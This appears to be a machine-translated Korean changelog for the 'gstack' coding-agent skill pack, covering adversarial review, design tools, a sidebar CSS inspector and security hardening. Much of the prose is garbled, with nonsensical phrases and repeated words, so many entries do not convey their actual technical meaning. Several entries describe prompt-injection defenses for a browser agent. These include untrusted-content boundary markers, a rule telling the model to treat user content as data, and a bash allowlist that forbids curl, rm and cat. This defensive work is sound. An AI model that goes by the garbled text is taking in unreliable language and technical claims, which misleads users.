- **납품 Integrity는 강화했습니다.** 기존 계획 완료 감사는 WHY 항목이 누락되어 있습니다 (그렇지 않은 것) 학습으로 계획 파일 discrepancies를 로그. Commit-message inference는 정보 만, 결코 지속되지 않습니다.

## [0.14.3.0] - 2026-03-31. 항상 Adversarial Review + Scope Drift + 계획 모드 디자인 도구

모든 코드 검토는 이제 Claude과 Codex 모두의 adversarial 분석을 실행합니다. 5-line auth 변경은 500 라인 기능으로 동일한 크로스 모델 scrutiny를 가져옵니다. 오래된 "작은 디프에 대한 스키 프리랜서"의 허리적은 사라졌습니다 ... diff 크기는 위험에 대한 좋은 프록시가 없었습니다.

### 추가

- **항상 모험 검토.** `/review`와 `/ship`는 이제 Claude adversarial subagent와 Codex adversarial 도전을 파견했습니다. No 더 계층 기반 Skipping. Codex 구조화 된 검토 (형 P1 pass/fail 문)는 여전히 형식적인 문이 값을 추가하는 큰 diffs (200+ 선)에 달합니다.
- **`/ship`의 범위 편류 탐지.** 배송 전에, `/ship` 이제 당신이 빌드하는 것을 구축했는지 여부를 확인합니다. 더 이상 아무것도. 캐치 범위 크레프 ("내가 있었다 ..."변경) 및 누락 된 요구 사항. 결과는 PR 몸에 나타났습니다.
- **계획 형태 안전한 가동.** 스크린 샷, 디자인 모조, Codex 외부 목소리, 그리고 `~/.gstack/`로 글을 쓰는 것은 계획 모드에서 명시적으로 허용됩니다. 디자인 관련 기술 (`/design-consultation`, `/design-shotgun`, `/design-html`, `/plan-design-review`)은 계획 모드 제한없이 계획하는 동안 시각적 인 식을 생성 할 수 있습니다.

### 변경

- **Adversarial 옵트 아웃 분할.** 레거시 `codex_reviews=disabled` 설정은 이제 단지 문 Codex 패스만. Claude adversarial subagent는 항상 무료이고 빠릅니다. 이전의 kill 스위치는 모든 것을 비활성화합니다.
- **크로스 모델 텐션 형식.** 외부 음성 disagreements는 이제 `RECOMMENDATION`와 `Completeness` 점수를 포함하고, 표준 AskUserQuestion 체재는 gstack에서 다른 곳에서 이용했습니다.
- **Scope drift는 이제 공유 된 해결자입니다.** `/review`에서 `generateScopeDrift()`로 추출해 `/review`와 `/ship` 둘 다 동일한 논리를 이용합니다. DRY.

## [0.14.2.0] - 2026-03-30. 사이드바 CSS 검사기 + Per-Tab 에이전트

사이드바는 이제 시각적 디자인 도구입니다. 페이지에 요소를 선택하고 전체 CSS 규칙 캐스케이드, 상자 모델 및 사이드 패널에서 올바른 스타일을 계산합니다. 편집 스타일은 라이브하고 즉시 변경 사항을 볼 수 있습니다. 각 브라우저 탭은 독립적 인 에이전트를 가져옵니다. 그래서 크로스 토크없이 여러 페이지를 동시에 작동 할 수 있습니다. 정리는 LLM 전원 ... 에이전트 스냅 샷 페이지, 그것을 이해, 정적, 그리고 junk의 정체성을 유지하면서 junk의 사이트를 유지하면서 제거.

### 추가

- **CSS 사이드바에 검사기.** "Pick Element", hover over any, click it, 그리고 sidebar는 특정 배지, 소스 파일: 라인, 상자 모형 시각화 (gstack 팔레트 색상), 및 계산 된 스타일로 가득 차있는 CSS 규칙 폭포를 보여줍니다. Chrome DevTools와 같은, 그러나 사이드바 안쪽에.
- **라이브 스타일 편집.** `$B style .selector property value` CDP를 통해 실시간 CSS 규칙을 수정합니다. 페이지에 즉시 표시를 변경합니다. `$B style --undo`를 사용하지 마십시오.
- **Per-tab 에이전트.** 각 브라우저 탭은 `BROWSE_TAB` env var를 통해 Claude 에이전트 프로세스를 가져옵니다. 브라우저에서 탭을 전환하고 그 탭의 채팅 기록에 대한 사이드바 스왑. 어떤 탭이 활성화되어 에이전트가 싸우지 않고 병렬에 대한 질문.
- **탭 추적.** 사용자 생성 탭 (Cmd+T, 마우스 오른쪽 클릭 "새 탭에서 열기")는 자동으로 `context.on('page')`를 통해 추적됩니다. 사이드바 탭 바는 실시간으로 업데이트됩니다. 브라우저를 전환하려면 사이드바 탭을 클릭합니다. 탭을 닫고 사라집니다.
- **LLM-powered 페이지 정리.** 클린업 버튼은 사이드바 에이전트 (IS LLM)로 프롬프트를 보냅니다. 이 에이전트는 세례적인 첫 번째 패스를 실행하고, 페이지를 스냅 샷, 왼쪽 분석하고, 사이트 브랜드를 보존하면서 clutter를 지능적으로 제거합니다. brittle CSS selectors없이 모든 사이트에서 작동합니다.
- **꽤 스크린 샷.** `$B prettyscreenshot --cleanup --scroll-to ".pricing" ~/Desktop/hero.png`는 1개의 명령에 있는 정리, 스크롤 포지셔닝 및 스크린 샷을 결합합니다.
- **버튼 중지.** 에이전트가 작동할 때 빨간색 스톱 버튼이 사이드바에 나타납니다. 현재 작업을 취소하려면 클릭하십시오.
- **CSP 검사기를 위한 fallback.** 사이트 엄격한 내용 보안 정책 (SF Chronicle과 같은) 이제 항상 로드 된 콘텐츠 스크립트를 통해 기본 피커를 얻을. 당신은 computed 스타일, 상자 모델, 그리고 같은 - 리긴 CSS 규칙을 참조하십시오. 그것을 허용하는 사이트의 전체 CDP 모드.
- **Cleanup + 채팅 도구 모음의 스크린 샷 버튼.** debug에서 숨겨지지지지 않아 채팅에 있습니다. 차단할 때 비활성화하면 오류 스팸을 제거하지 않습니다.

### 고정

- **Inspector 메시지 허용 목록.** background.js allowlist는 모든 검사기 메시지 유형, 침묵으로 그(것)들을 거부했다. 검사기는 모든 페이지를 위해 부서졌다, 뿐만 아니라 CSP 제한되는 것. (Codex 검토에 의해 부상.)
- **Sticky nav 보전.** Cleanup no는 사이트 상단의 nav bar를 제거합니다. 위치별로 끈끈한 요소를 정렬하고 상단의 첫 번째 전체 폭 요소를 보존합니다.
- **에이전트가 멈추지 않을 것입니다.** 시스템 프롬프트는 이제 에이전트가 concise 및 중지 될 때. No 더 끝없는 스크린 샷 및 하이라이트 루프.
- **훔치는 초점.** 에이전트 명령 no 더 긴 pull Chrome 이지. 내부 탭 핀으로 꼿는 사용 `bringToFront: false`.
- **채팅 메시지 dedup.** 이전 세션 no에서 이전 메시지가 다시 연결에 더 긴 반복.

### 변경

- **Sidebar 배너** 이제 이전 모드 별 텍스트 대신 "Browser co-pilot"을 말한다.
- **입력 위주**는 "이 페이지에 대해 이야기 ..."(이전의 주주보다 더 많은 참여).
- **시스템 프롬프트**는 보안 감사에서 신속한 주입 방위 및 허용된 합병 백리스트를 포함합니다.

## [0.14.1.0] - 2026-03-30. 비교표는 선택자입니다

디자인 비교 널은 이제 항상 변형을 검토 할 때 자동으로 열립니다. No 더 인라인 이미지 + "당신이 선호합니까?". 보드는 제어, 의견, remix/regenerate 버튼 및 구조화 된 피드백 출력을 평가했습니다. 그것은 경험입니다. 모든 3 디자인 기술 (/plan-design-review, /design-shotgun, /design-consultation)이 수정을 얻습니다.

### 변경

- **비교표는 이제 필수입니다.** 디자인 변형을 생성한 후, 에이전트는 `$D compare --serve`와 비교 보드를 만들고 AskUserQuestion을 통해 URL를 보내줍니다. 보드, click 제출과 상호 작용하며, 에이전트는 `feedback.json`에서 구조화 된 피드백을 읽습니다. No는 기본 대기 메커니즘으로 오염 루프를 더 많이 읽습니다.
- **AskUserQuestion는 대기, 선택자가 아닙니다.** 에이전트는 AskUserQuestion를 사용하여 보드가 열리고, 당신이 완료하는 동안 기다립니다, 현재 변형 인라인 및 환경 설정을 요청하지. 보드 URL는 항상 포함되므로 탭을 잃을 경우 click를 통해 click 할 수 있습니다.
- **Serve-failure fallback 개선.** 비교 널 서버가 시작될 수 없는 경우에, 변종은 선호도를 요구하기 전에 읽기 도구를 통해 인라인으로 보입니다. 당신은 no 더 긴 선택 장님입니다.

### 고정

- **널 URL는 정정했습니다.** 복구 URL 현재 `http://127.0.0.1:<PORT>/` (서버가 실제로 봉사하는 곳) 대신 `/design-board.html` (이 404)를 사용합니다.

## [0.14.0.0] - 2026-03-30. 코드 설계

이제는 하나의 명령으로 생산 품질 HTML에 대한 승인 된 디자인의 조업에서 갈 수 있습니다. `/design-html`는 `/design-shotgun`에서 우승 디자인을 취하고, 크기를 조절하는 텍스트가 실제로 썰물 인 Pretext-native HTML를 생성합니다. No는 더 단단한 CSS 고도 또는 끊긴 텍스트 오버플로우가 있습니다.

### 추가

- **`/design-html` 기술.**는 `/design-shotgun`에서 승인된 조업을 가지고 가고, 계산된 원본 배치를 위한 Pretext를 가진 각자 달성된 HTML를 생성합니다. 똑똑한 API 여정은 각 디자인 유형 (간단한 배치, 카드 격자, 잡담 거품, 편집 퍼짐)를 위한 권리 Pretext 본을 선택합니다. 브라우저에서 시사하는 정제 반복을 포함해서, 의견 및 그것에게 그것을 맞출 때까지 이.
- **Pretext 공급.** 30KB Pretext 소스는 `design-html/vendor/pretext.js`에서 따로 잇기, 0-dependency HTML 산출을 위해 묶었습니다. 기구 산출 (React/Svelte/Vue)는 npm 대신 설치합니다.
- **디자인 파이프라인 chaining.** `/design-shotgun` 단계 6는 지금 다음 단계로 `/design-html`를 제안합니다. `/design-consultation`는 스크린 수준 디자인을 일으키기 후에 그것을 건의합니다. `/plan-design-review` 사슬은 둘 다 `/design-shotgun`와 `/design-html`와 더불어 검토 기술에 따릅니다.

### 변경

- **`/plan-design-review` 다음 단계 확장.** 이전에는 다른 검토 기술에 체인이 져 있습니다. 이제 `/design-shotgun` (explore variables)와 `/design-html` (확인된 모조에서 HTML 생성)도 제공합니다.

## [0.13.10.0] - 2026-03-29. 사무실 시간은 독서 명부를 가져옵니다

/office-hours 사용자는 이제 같은 YC 닫히는 대신 신선한, curated 자원을 얻습니다. 34개의 손으로 찍은 영상과 에세이 Garry Tan, Lightcone Podcast, YC Startup School, Paul Graham, 그리고 세션 중 어떤 것이 왔다는 것을 상황에 따라. 시스템은 이미 보여준 것을 기억하므로 두 번 동일한 권고를 볼 수 없습니다.

### 추가

- **/office-hours 닫는에 있는 설립자 자원 자전.** 34개 부문별 평가(Garry Tan비디오, YC 백스토리, Lightcone Podcast, YC Startup School, Paul Graham essays). Claude 세션별 세션별 2-3개가 임의로 세션 컨텍스트를 기반으로 합니다.
- **리소스 dedup 로그.** 자원이 `~/.gstack/projects/$SLUG/resources-shown.jsonl`에서 보여준 트랙을 통해 사용자들이 항상 신선한 콘텐츠를 볼 수 있습니다.
- **Resource 선택 분석.** 자원이 `skill-usage.jsonl`에 픽업되는 로그를 기록하므로 패턴을 볼 수 있습니다.
- **브라우저 오픈 제공.** 리소스를 보여주기 후 브라우저에서 열리게 되므로 나중에 체크할 수 있습니다.

### 고정

- **스크립트 chmod 안전망 구축** `bun build --compile` 출력은 현재 `chmod +x`를 명시적으로 적으로 얻고, "permission denied" 오류를 방지하여 작업 공간 복제 또는 파일 전송 중에 권한이 실행됩니다.

## [0.13.9.0] - 2026-03-29. 능력

Skills는 이제 다른 기술 인라인을로드 할 수 있습니다. 템플릿에서 `{{INVOKE_SKILL:office-hours}}`를 작성하고 발전기는 "읽는 파일, 건너뛰기 preamble, 지침을 따르십시오"를 자동으로 자동적으로 생성합니다. 호스트 인식 경로와 사용자 정의 가능한 건너뛰기 목록을 처리하십시오.

### 추가

- **`{{INVOKE_SKILL:skill-name}}` 해결자.** 1 급 결심자로 적재하는 Composable 기술. Emits 주인 인식은 다른 기술 SKILL.md를 읽는 Claude 또는 Codex를 말하는 것을 prose를 돕고, 선을, 전방 단면도를 건너 뛰기 따르. 여분 단면도를 위한 선택적인 `skip=` 모수를 지원하십시오 건너뛰기 위하여.
- **Parameterized 결심자 지원.** 위주자는 `{{NAME:arg1:arg2}}`를 처리하고, 생성 시간에 인수를 갖는 결의자를 가능하게 합니다. 기존 `{{NAME}}` 패턴과 완벽하게 뒤섞인 호환이 됩니다.
- **`{{CHANGELOG_WORKFLOW}}` 해결자.** 변경 로그 생성 논리는 /ship에서 재사용 가능한 해결사로 추출했습니다. 음성 안내 ("현재 사용자가 할 수있는 것과 함께 리드") 인라인을 포함합니다.
- **기술 등록을 위한 Frontmatter `name:`.** 설정 스크립트와 gen-skill-docs 이제 `name:` symlink naming의 SKILL.md frontmatter에서 `name:`를 읽습니다. `/test`로 등록된 invocation name과 다른 디렉토리 이름을 입력하십시오.
- **Proactive 기술 여정.** Skills now asked once to add routing rules to your project's CLAUDE.md. 이것은 Claude 직접 응답 대신 적절한 기술을 자동으로 호출합니다. 당신의 선택은 `~/.gstack/config.yaml`에서 기억됩니다.
- **주석 설정 파일.** `~/.gstack/config.yaml` 이제는 각 설정에 대해 첫 번째 생성에 문서화 헤더를 가져옵니다. 언제든지 편집하십시오.

### 변경

- **BENEFITS_FROM 이제 INVOKE_SKILL로 위임합니다.** 에리드 복제된 뚜렷한 뚜렷한 뚜렷한 뚜렷한 뚜렷한 궤적 궤적. BENEFITS_FROM의 사전 예약 제안 래퍼 체재는, 그러나 실제적인 "읽고 따르는" 지시 INVOKE_SKILL에서 옵니다.
- **/plan-ceo-review 중간 보유 미들 백은 INVOKE_SKILL를 사용합니다.** "사용자는 문제가 미립자를 수 없으며, /office-hours" 경로를 사용하면 인라인 프로세스 대신 작곡 가능한 해결자를 사용합니다.
- **강력한 라우팅 언어.** 사무실 시간, 조사 및 배 묘사는 지금 “Proactively invoke” 대신에 “Proactively suggest” 더 믿을 수 있는 자동적인 기술 invocation를 위한 말 “Proactively invoke” 말하고.

### 고정

- **Config grep은 라인 시작에 고정.** 덧붙였다 헤더 라인 no 더 긴 그림자 실제 설정 값.

## [0.13.8.0] - 2026-03-29. 보안 감사 라운드 2

검색 출력은 이제 신뢰 경계표에 감싸이는 것입니다 그래서 에이전트는 도구 출력에서 페이지 내용을 말할 수 있습니다. 마커는 탈출 방지입니다. Chrome 확장은 메시지 발송자를 유효하게합니다. CDP 로컬 호스트에 바인딩합니다. Bun 사용 체크섬 검증을 설치합니다.

### 고정

- **신뢰 경계표는 탈출 증거입니다.** URL은 만족 (no newlines), 마커 문자열은 내용에 탈출. 악의적인 페이지는 END 마커를 강제로 비신뢰 차단할 수 없습니다.

### 추가

- **콘텐츠 신뢰 경계표.** 페이지 내용 (`text`, `html`, `links`, `forms`, `accessibility`, `console`, `dialog`, `snapshot`, `diff`, `resume`, `watch stop`)를 반환하는 모든 검색 명령은 `--- BEGIN/END UNTRUSTED EXTERNAL CONTENT ---` 마커에서 출력했습니다. 에이전트은 페이지 내용 대 도구 산출을 알고 있습니다.
- **연장 sender 유효성.** Chrome 확장은 알 수없는 senders에서 메시지를 거부하고 메시지 유형의 허용 목록을 시행합니다. 크로스 확장 메시지 스포핑을 방지합니다.
- **CDP localhost-only 바인딩.** `bin/chrome-cdp`는 이제 `--remote-debugging-address=127.0.0.1`와 `--remote-allow-origins`를 통과하여 리모트 디버깅 노출을 방지합니다.
- **Checksum-verified bun 설치.** 검색 SKILL.md 부츠 스트랩 이제 bun install script를 temp 파일에 다운로드하고 실행하기 전에 SHA-256을 정의합니다. No 더 많은 배관 컬을 bash로 묶습니다.

## 제거

- **Factory Droid 지원.** `--host factory`, `.factory/` 생성된 기술, 공장 CI 체크 및 모든 공장 특정 코드 경로 제거.

## [0.13.7.0] - 2026-03-29. 커뮤니티 웨이브

6개의 커뮤니티는 16개의 새로운 테스트를 거쳐 수정됩니다. 현재 텔레메테이션은 어디에나 떨어져 있습니다. 기술들은 이름에 의해 찾을 수 있습니다. 그리고 당신의 접두사 조정을 실제로 지금 바꾸십시오.

### 고정

- **텔레메틱은 어디에 떨어져 있습니다.** 텔레메트리를 꺼낼 때 gstack no 는 로컬 JSONL 분석 파일을 더 긴 쓰기. 이전 "off"는 원격 보고만 중지. 이제 아무 것도 어디에서나 쓰지 않습니다. 신뢰 계약을 청소하십시오.
- **`find -delete` POSIX `-exec rm`로 대체했습니다.** 안전 그물 및 기타 비GNU 환경 no 세션 정리에 더 긴 choke.
- **No 더 많은 비난된 상황 경고.** `/plan-eng-review` no 더 긴 상황에서 낮은 실행에 대해 경고합니다. 시스템은 조밀함을 자동으로 처리합니다.
- **Sidebar 보안 테스트 업데이트** 글쓰기 도구가 떨어지는 문자열 변경.
- **`gstack-relink` no 더 긴 두 배 접두사 `gstack-upgrade`.** `skill_prefix=true` 를 설정하면 `gstack-gstack-upgrade` 을 생성하고 기존 이름을 유지하고 있습니다. 이제 `setup` 스크립트 동작을 일치시킵니다.

### 추가

- **기술 발견.** 모든 기술 설명은 이제 "(gstack)"을 포함하므로 gstack 기술을 검색하여 Claude Code의 명령 팔레트를 찾을 수 있습니다.
- **`/ship`에 있는 기능 신호 탐지.** 버전 범프는 이제 새로운 노선, 마이그레이션, 테스트 + 소스 쌍 및 `feat/` branch에 대한 확인을 확인합니다. Catches MINOR-worthy changes that line count alone misses.
- **Sidebar 쓰기 도구.** 양쪽 사이드바 에이전트와 헤더드 모드 서버는 이제는 AllowTools에 쓰기를 포함한다. 쓰기는 Bash가 이미 제공하는 것을 넘어 공격 표면을 확장하지 않습니다.
- **사이드바 stderr 캡처.** 사이드바 에이전트는 이제 stderr를 버리고, 침묵적으로 그것을 쫓는 대신 오류 및 타임 아웃 메시지에 포함.
- **`bin/gstack-relink`** 재생 기술은 `gstack-config set`를 통해 `skill_prefix`를 바꾸면 기술 symlink를 만듭니다. No 더 수동 `./setup` 재 실행 필요.
- **`bin/gstack-open-url`** 크로스 플랫폼 URL 오프너 (macOS: `open`, Linux: `xdg-open`, Windows: `start`).

## [0.13.6.0] - 2026-03-29. GStack 자세히 알아보기

모든 세션은 이제 다음 스마트하게 만듭니다. gstack는 세션 전반에 걸쳐 패턴, pitfalls 및 선호도를 기억하고 모든 리뷰, 계획, 디버그 및 배송을 개선하기 위해 사용합니다. 더 많은 것을 사용하면 코디베이스에 더 잘 활용됩니다.

### 추가

- **프로젝트 학습 시스템.** gstack는 /review, /ship, /investigate 및 기타 기술에 대해 발견하고 패턴을 캡처합니다. `~/.gstack/projects/{slug}/learnings.jsonl`에서 프로젝트당 저장. 단, Supabase 호환 스키마.
- **`/learn` 기술.** gstack가 배운 것을 검토하십시오 (`/learn`), 검색 (`/learn search auth`), prune stale 항목 (`/learn prune`), markdown (`/learn export`)에 수출, 또는 검사 통계 (`/learn stats`). 수동으로 `/learn add`와 학습을 추가하십시오.
- **Confidence 구경측정.** 이제 발견하는 모든 리뷰는 신뢰 점수 (1-10)를 포함합니다. 높은 confidence는 일반적으로, 중간 (5-6)를 동굴로 표시하는, 낮은 (<5)를 억제합니다. No 더 울리는 wolf.
- **"Learning apply" 콜 아웃.** 검토가 과거 학습과 일치할 때, gstack는 표시한다: "Prior Learning apply: [pattern] (confidence 8/10, from 2026-03-15)". 당신은 행동에서 합성을 볼 수 있습니다.
- **크로스 프로젝트의 발견.** gstack는 일치 본을 위한 당신의 다른 프로젝트에서 학습을 검색할 수 있습니다. 동의를 위한 1 시간 AskUserQuestion와 더불어 Opt-in. 당신의 기계에 지방을 체재하십시오.
- **불임.** 관찰 및 인퍼런스 학습은 30 일 당 1개의 신뢰점을 잃습니다. 사용자 통계적인 선호도는 감퇴하지 않습니다. 좋은 본은 영원히 좋은 본이지만, 관찰이 퇴색되지 않습니다.
- **학습은 전방에서 계산합니다.** 각 기술이 이제 시작 중 "LEARNINGS: N 항목로드"를 보여줍니다.
- **5 릴리스 로드맵 디자인 doc.** `docs/designs/SELF_LEARNING_V0.md`는 R1 (GStack Learns)에서 R4 (/autoship, R5 (Studio)로 경로에 접근합니다.

## [0.13.5.1] - 2026-03-29. 거짓 .factory

### 변경

- **`.factory/` 디렉토리를 추적합니다.** 생성됨 Factory Droid 기술 파일은 이제 `.claude/skills/`와 `.agents/`와 동일하게 gitignored 입니다. repo에서 29 생성된 SKILL.md 파일을 제거합니다. `setup` 스크립트와 `bun run build`는 이 수요를 재생합니다.

## [0.13.5.0] - 2026-03-29. Factory Droid 호환성

gstack는 이제 공장 갑옷과 함께 작동합니다. Droid의 `/qa`를 입력하고 Claude 코드에서 사용하는 동일한 29 기술을 얻으십시오. 이것은 gstack를 통해 작동하는 첫번째 기술 도서관, Claude Code, Codex 및 공장 갑옷을 만듭니다.

### 추가

- **Factory Droid 지원 (`--host factory`).** `bun run gen:skill-docs --host factory`를 가진 공장 고유 기술을 생성하십시오. 기술은 /ship와 /land-and-deploy와 같은 과민한 기술을 위한 `user-invocable: true`, `disable-model-invocation: true`를 가진 `.factory/skills/`에 설치합니다.
- **`--host all` 플래그.** 1개의 명령은 모든 3개의 호스트를 위한 기술을 생성합니다. 실패하에: 호스트 오류를 붙잡고, Claude 발생이 실패하면 실패합니다.
- **`gstack-platform-detect` 이진.**는 버전, 기술 경로 및 gstack 상태에 설치된 AI 코딩 에이전트의 테이블을 인쇄합니다. 다중 호스트 설정을 디버깅하는 데 유용합니다.
- **민감한 기술 안전.** 부작용 (선박, 땅 및 배치, 감시, 주의깊고, 동결, 부동)를 가진 6개의 기술은 지금 그들의 템플렛에 있는 `sensitive: true`를 선언합니다. Factory Droids는 그(것)들을 자동 호출하지 않을 것입니다. Claude와 Codex 산출 지구는 분야를 벗깁니다.
- **공장 CI 신선도 검사.** 기술 문서 워크플로우는 이제 각 PR에서 공장 출력을 신선하게 검증합니다.
- **작업 툴링에 대한 공장 인식.** 기술 검사 대쉬보드, gstack-uninstall 및 설정 스크립트 모두 공장에 대해 알고 있습니다.

### 변경

- **멀티 호스트 생성을 재확인했습니다.**는 `processExternalHost()`는 Codex 특정 코드 구획에서 돕는 것을 공유했습니다. 둘 다 Codex와 공장은 산출 여정, symlink 반복 탐지, frontmatter 변환 및 경로 재쓰기를 위한 동일한 기능을 이용합니다. Codex 산출은 재공장 후에 byte-identical입니다.
- **스크립트를 `--host all` 로 컴파일한다.**는 단일 `--host all` invocation과 `gen:skill-docs` 호출을 체인으로 대체합니다.
- **공장에 대한 도구 이름 번역.** Claude Code 도구명("Bash 도구 사용)은 공장 출력에서 일반 파라싱("run this command")로 번역되며, 공장의 도구 naming Conventions에 매칭합니다.

## [0.13.4.0] - 2026-03-29. 사이드바 방어

Chrome sidebar는 이제 신속한 주사 공격에 대한 방어합니다. 세 개의 레이어 : XML-framed prompts with trust boundaries, 명령 allowlist 을 제한하여 명령을 검색하고, default 모델 (행동)으로 Opus를 제한합니다.

### 고정

- **Sidebar 에이전트는 이제 서버 측 args를 존중합니다.** 사이드바 에이전트 과정은 스크래치, `--model`, `--allowedTools`, 서버가 설정한 다른 플래그를 무시하고, `--allowedTools`에서 자신의 Claude args를 침묵적으로 재구성했습니다. 모든 서버 측 구성 변경은 침묵적으로 떨어졌습니다. 이제는 할당된 args를 사용합니다.

### 추가

- **XML 신뢰 경계로 짜맞추는 프롬싱.** 사용자 메시지는 `<user-message>` 태그로 감싸고, 데이터로 콘텐츠를 처리하는 지시를 가진 지시를 가진 지시를 가진. XML 특별한 특성 (`< > &`)는 꼬리표 주입 공격을 방지하기 위하여 탈출됩니다.
- **Bash 명령 수당.** 사이드바의 시스템 프롬프트는 이제 Claude를 제한하여 이진 명령만 (`$B goto`, `$B click`, `$B snapshot`, 등)을 검색합니다. 다른 모든 bash 명령 (`curl`, `rm`, `cat`, 등)은 금지됩니다. 이것은 임의 실행 코드에 escalating에서 신속한 주입을 방지합니다.
- **Opus default 사이드바.** 사이드바는 이제 default에 의해 Opus (최대 주입 저항하는 모형)를, 어떤 모형 Claude Code가 달리기 위하여 일어나기 위하여 시키는 어떤 모형의 대신 사용합니다.
- **ML 신속한 주입 방위 디자인 doc.** `docs/designs/ML_PROMPT_INJECTION_KILLER.md`에 전체 디자인 doc은 다음 PR를 위해 ML 분류기 (DeBERTa, BrowseSafe-bench, Bun-native 5ms 시각)를 덮습니다. P0 TODO는 다음 PR를 위해.

## [0.13.3.0] - 2026-03-28. 잠금이 아래로

커뮤니티 PR 및 버그 보고서에서 여섯 가지 수정. 큰 것 : 당신의 종속 나무는 이제 핀으로. 모든 `bun install`는 정확한 동일한 버전을 해결, 매번. No 모든 설정에서 npm에서 신선한 패키지를 끌어 당기는 더 떠있는 떠있는 범위.

### 고정

- **현재 위치가 핀으로 꼿습니다.** `bun.lock`는 투입되고 추적됩니다. 각 설치는 npm에서 `^` 범위 대신 동일한 버전을 해결합니다. #566에서 공급 사슬 벡터를 닫습니다.
- **`gstack-slug` no 더 긴 git 저장소 밖에 충돌.**는 no 리모트 또는 HEAD가 있을 때 디렉토리 이름과 “unknown” branch에 뒤를 뒤를 뿌립니다. slug 탐지에 달려 있는 각 검토 기술은 지금 비git 상황에 있습니다.
- **`./setup` no CI에서 더 긴 걸림새.** 기술 접두사 프롬프트는 10 초 후에 지금 자동 선택 짧은 이름입니다. 지휘자 workspaces, Docker 구조 및 무인화한 설치는 인간적인 입력 없이 진행합니다.
- **CLI는 Windows에서 작동합니다.** 서버 lockfile은 `'wx'` 문자열 플래그 대신 `fs.constants` 를 Bun 컴파일된 binaries가 Windows에서 처리하지 않는 것을 사용한다.
- **`/ship` 및 `/review`는 당신의 디자인 docs를 찾아내습니다.** 플랜 검색은 `~/.gstack/projects/` 먼저 `/office-hours`가 디자인 문서를 작성합니다. 이전에는 잘못된 감독을 찾고 있기 때문에, 계획 검증이 자동으로 건너 뛰었습니다.
- **`/autoplan` 듀얼-voice 실제로 작동.** 배경 에이전트은 파일 (Claude Code 제한)를 읽을 수 없습니다, 그래서 Claude 음성은 각 뛰기에 침묵하게 실패했습니다. 이제 전장에서 순차적으로 실행합니다. 두 목소리는 consensus 테이블의 앞에 완료합니다.

### 추가

- **PR 가드 레일 CLAUDE.md** ETHOS.md, 홍보 자료, Garry의 음성은 사용자 승인 없이 수정에서 명시적으로 보호됩니다.

## [0.13.2.0] - 2026-03-28. 사용자의 소위

AI 모델은 이제 배속 대신 권장한다. Claude와 Codex 범위 변경에 동의하면, 그들은 단지 그것을 할 대신 당신에게 선물한다. 당신의 방향은 default, 모델의 합의가 아닙니다.

### 추가

- **ETHOS.md의 사용자권리 원칙.** 세 번째 핵심 원칙: AI 모델 추천, 사용자 결정. 크로스 모델 계약은 강력한 신호, 위임하지 않습니다.
- **/autoplan의 사용자 챌린지 카테고리.** 두 모델 모두 동의하면 명시된 방향이 변경되어야하며 자동 발산되는 대신 "User Challenge"로 최종 승인 게이트로 이동합니다. 명시적으로 변경하지 않는 한 원래 방향은 의미합니다.
- **보안/feasibility 경고 framing.** 두 모델 모두 보안 위험 (만약한)로 무언가를 플래그면, 명시적으로 경고하면 안전상의 우려가 아니라 맛의 통화가 아닙니다.
- **CEO 및 Eng review에 대한 외부 음성 통합 규칙.** 외부 음성 발견은 각 것을 명시적으로 승인할 때까지 정보를 제공합니다.
- **모든 기술 목소리의 사용자 소위 진술.** 각 기술에는 크로스 모델 계약이 권고되지 않은 규칙이 포함되어 있습니다.

### 변경

- **Cross-model 텐션 템플릿 no 더 긴 "자유의 평가"** 이제 "현재 두 관점 모두 중립적으로, 당신이 누락 될 수있는 상태"옵션에서 확장 /Skip에서 Accept/Keep/Investigate/Defer.
- **/autoplan 이제 두 개의 게이트가 있습니다.** 전제 (상 1) 및 사용자 도전 (단일 모델은 방향에 동의). "전제는 한 게이트"에서 "두 개의 게이트"로 업데이트 된 중요한 규칙.
- **Decision Audit Trail은 이제 분류를 추적합니다.** 각 자동절단은 기계, 맛, 또는 사용자 challenge로 기록됩니다.

## [0.13.1.0] - 2026-03-28. 깊이 방어

검색 서버는 localhost에서 실행하고 액세스의 token을 필요로하므로, 해당 문제는 이미 기계 (예 : 타협 된 npm postinstall 스크립트)에서 실행되는 경우에만 문제가 발생합니다. 이 릴리스는 공격 표면이 그 시나리오에서 손상이 포함 된 것입니다.

### 고정

- **Auth token removed from `/health` endpoint.** 토큰은 `.auth.json` 파일 (0o600 권한)을 통해 배포됩니다.
- **쿠키 피커 데이터 경로는 이제 Bearer auth가 필요합니다.** HTML 테이너 페이지는 여전히 열려 있습니다 (UI 포탄입니다), 그러나 모든 자료 및 활동 엔드포인트는 토큰을 검사합니다.
- **CORS `/refs`와 `/activity/*`에 조이.** 와일드카드 origin 헤더를 제거해, 웹 사이트가 검색 활동 크로스 라이진을 읽을 수 없습니다.
- **7 일 후에 주 파일 자동 폭발.** 쿠키 상태 파일은 이제 stale이면 로드에 타임 스탬프와 경고를 포함합니다. 서버 시작은 7 일 이상 파일 정리.
- **`innerHTML` 대신 `textContent`를 사용합니다.**는 DOM 주사를 막을 때 서버 보호한 자료가 붙은 표로 위로 포함될 때 막습니다. 브라우저 연장을 위한 표준 방어에서 심도.
- **Path validation은 경계 체크 전에 symlinks를 해결합니다.** `validateReadPath`는 `realpathSync`를 호출하고 macOS `/tmp` symlink를 올바르게 취급합니다.
- **Freeze Hook은 휴대용 경로 해결책을 사용합니다.** POSIX-compatible (핵심 없이 macOS에 삽화), `/project-evil`가 `/project`에 동봉한 세트도 일치할 수 있던 가장자리 케이스를 고칠 수 있었습니다.
- **Shell config 스크립트는 입력을 검증합니다.** `gstack-config`는 regex 특별한 열쇠를 거절하고 sed 본을 탈출합니다. `gstack-telemetry-log`는 branch/repo 이름을 JSON 출력에 넣습니다.

### 추가

- 20 회귀 시험은 모든 경화 변화를 덮습니다.

## [0.13.0.0] - 2026-03-27. 너의 에이전트은 지금 디자인할 수 있습니다

gstack는 실제 UI의 조업을 생성할 수 있습니다. ASCII 예술은, 당신이 보기, 비교, 선택, 그리고 그것에 그것을 볼 수 있는 진짜 시각 디자인의 원본 묘사를 아닙니다. UI 아이디어에 `/office-hours`를 달리고 당신은 당신이 좋아하는, 다른 사람을 골라내는 비교 널에 있는 3개의 시각적인 개념을 얻을 것입니다, 그리고 변화하는 에이전트에게 말하십시오.

### 추가

- **디자인 바이너리** (`$D`). New compiled CLI wrapping OpenAI's GPT Image API. 13 commands: `generate`, `variants`, `iterate`, `check`, `compare`, `extract`, `diff`, `verify`, `evolve`, `prompt`, `serve`, `gallery`, `setup`. Generates pixel-perfect UI mockups from structured design briefs in ~40 seconds.
